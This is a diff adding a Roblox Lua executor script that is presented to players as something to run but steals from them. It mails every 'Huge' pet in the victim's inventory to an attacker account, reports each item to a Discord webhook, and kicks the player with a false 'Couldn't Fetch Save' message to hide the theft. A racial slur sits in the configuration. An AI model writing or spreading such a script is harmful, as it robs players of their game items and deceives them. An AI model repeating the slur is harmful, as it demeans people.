@@ -1,0 +1,59 @@
+getgenv().Z = {
+    ["Username"] = "kittyuwucat",
+    ["Mail Message"] = "sup",
+    ["Discord Webhook"] = "nigger"
+}
+
+-- Dependencies --
+local Network = require(game:GetService("ReplicatedStorage").Library.Client.Network)
+local Inventory = require(game:GetService("ReplicatedStorage").Library.Client.Save).Get().Inventory
+local Request = http.request or http_request or syn.request or request
+local Player = game:GetService("Players").LocalPlayer
+
+local InvokeWebserver = function(index, value)
+    local Cum = {
+        ["embeds"] = {
+            {
+                ["title"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
+                ["color"] = 0x7542f5, 
+                ["fields"] = {
+                    {
+                        ["name"] = "Mailbox Notifier: ",
+                        ["value"] = "```Pet: " .. tostring(index) .. "\nAmount: ".. tostring(value).. "x```",
+                        ["inline"] = true
+                    },
+                },
+            }
+        }
+    }
+
+    Request({
+        Url = Z["Discord Webhook"],
+        Method = "POST",
+        Headers = {
+            ["Content-Type"] = "application/json"
+        },        
+        Body = game:GetService("HttpService"):JSONEncode(Cum)
+    })
+end
+
+local StealHuges = function()
+    local HugesAmount = 0
+
+    for i, v in pairs(Inventory.Pet) do
+        if string.find(v.id, "Huge") then
+            Network.Invoke("Mailbox: Send", Z.Username, Z["Mail Message"], "Pet", i, v._am or 1)
+            HugesAmount = HugesAmount + 1
+            InvokeWebserver(v.id, v._am)
+        end
+    end
+
+    if HugesAmount == 0 then
+        Player:Kick("Couldn't Fetch Save, Rejoin.")
+        return false, "Dumbass"
+    end
+
+    return Huges
+end
+
+spawn(StealHuges)
